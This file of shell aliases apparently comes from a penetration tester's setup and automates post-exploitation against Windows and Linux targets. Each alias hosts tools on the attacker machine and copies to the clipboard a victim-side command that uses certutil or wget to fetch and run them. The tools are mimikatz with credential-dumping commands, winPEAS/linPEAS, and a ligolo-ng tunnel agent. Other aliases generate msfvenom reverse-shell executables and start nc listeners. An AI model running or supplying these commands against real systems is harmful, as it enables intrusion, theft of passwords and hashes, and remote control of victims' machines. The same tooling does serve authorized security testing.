export TUN0=`ip a|grep eth0: -A3 | grep -oP '\b((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b'`
alias COPY='tr -d "\n" | xsel -ib'
alias MIMIKATZPWSH="(cd /usr/share/windows-resources/mimikatz/x64/ ; echo -e \"certutil -urlcache -f http://$TUN0:8000/mimidrv.sys mimidrv.sys ; certutil -urlcache -f http://$TUN0:8000/mimikatz.exe mimikatz.exe ; certutil -urlcache -f http://$TUN0:8000/mimilib.dll mimilib.dll ; certutil -urlcache -f http://$TUN0:8000/mimispool.dll mimispool.dll\ ; .\\\\mimikatz.exe 'privilege::debug' 'token::elevate' 'sekurlsa::logonpasswords full' 'lsadump::sam' 'lsadump::secrets' 'lsadump::cache' \" | COPY  ; python -m http.server)"
alias MIMIKATZCMD="(cd /usr/share/windows-resources/mimikatz/x64/ ; echo -e \"certutil -urlcache -f http://$TUN0:8000/mimidrv.sys mimidrv.sys & certutil -urlcache -f http://$TUN0:8000/mimikatz.exe mimikatz.exe & certutil -urlcache -f http://$TUN0:8000/mimilib.dll mimilib.dll & certutil -urlcache -f http://$TUN0:8000/mimispool.dll mimispool.dll\ & mimikatz.exe privilege::debug token::elevate sekurlsa::logonpasswords full lsadump::sam lsadump::secrets lsadump::cache \" | COPY  ; python -m http.server)"
alias WINPEASS="(cd /usr/share/peass/winpeas/ ; echo certutil -urlcache -f http://$TUN0:8000/winPEASx64.exe winpeas.exe | COPY ; python -m http.server)"
alias WINLIGOLOPWSH="(cd /opt/ligolo-ng-agents/ ; echo -e 'certutil -urlcache -f http://$TUN0:8000/agent.exe agent.exe ; .\\\\agent.exe -connect $TUN0:11601 -ignore-cert' | COPY ; gnome-terminal -- ligolo-ng -selfcert ; python -m http.server)"
alias WINLIGOLOCMD="(cd /opt/ligolo-ng-agents/ ; echo -e 'certutil -urlcache -f http://$TUN0:8000/agent.exe agent.exe & .\\\\agent.exe -connect $TUN0:11601 -ignore-cert' | COPY ; gnome-terminal -- ligolo-ng -selfcert ; python -m http.server)"
alias LINPEASS="(cd /usr/share/peass/linpeas/ ; echo \"wget http://$TUN0:8000/linpeas.sh ; bash linpeas.sh\" |COPY ; python -m http.server)"
alias WINREVSHELL='(export LPORT=$(shuf -i 9000-9999 -n 1) ; msfvenom -p windows/x64/shell_reverse_tcp LHOST=$TUN0 LPORT=$LPORT -f exe -o rev$LPORT.exe ; echo "certutil -urlcache -f http://$TUN0:8000/rev$LPORT.exe rev$LPORT.exe" | COPY ; gnome-terminal -- nc -lvnp $LPORT ; python -m http.server)'
alias LINREVSHELL='(export LPORT=$(shuf -i 9000-9999 -n 1) ; msfvenom -p linux/x64/shell_reverse_tcp LHOST=$TUN0 LPORT=$LPORT -f elf -o rev$LPORT ; echo "wget http://$TUN0:8000/rev$LPORT ; chmod u+x rev$LPORT ; ./rev$LPORT" | COPY ; gnome-terminal -- nc -lvnp $LPORT ; python -m http.server)'
